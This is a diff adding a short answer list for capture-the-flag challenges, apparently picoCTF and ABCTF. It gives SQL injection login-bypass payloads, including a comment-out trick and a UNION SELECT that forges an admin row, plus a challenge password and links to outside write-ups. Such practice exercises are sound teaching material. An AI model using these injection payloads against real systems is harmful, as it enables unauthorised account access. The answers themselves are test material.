@@ -1,0 +1,28 @@
+Solutions:
+
+Injection 1:
+Username: admin' --
+https://ehsandev.com/pico2014/web_exploitation/injection_1.html
+
+Injection 2:
+Username: whatever'AND 1=0 UNION ALL SELECT 'admin' AS username,  'whatever 'AS dummy,  'hax' AS password, 'whatever' AS dummy2, 2000 AS user_level -- 
+https://ehsandev.com/pico2014/web_exploitation/injection_2.html
+
+Injection 4:
+password: youllneverguessthispassword
+https://ehsandev.com/pico2014/web_exploitation/injection_4.html
+
+GetKey:
+https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/getkey
+
+robocommunication:
+https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/robomunication
+
+Second Contact: 
+https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/second-contact
+
+JS:
+https://github.com/ctfs/write-ups-2016/blob/master/abctf-2016/reversing/js-pls-80/deobfuscated.js
+
+Broken RSA:
+https://github.com/BatmansKitchen/ctf-writeups/tree/master/2013-picoctf/Broken_RSA
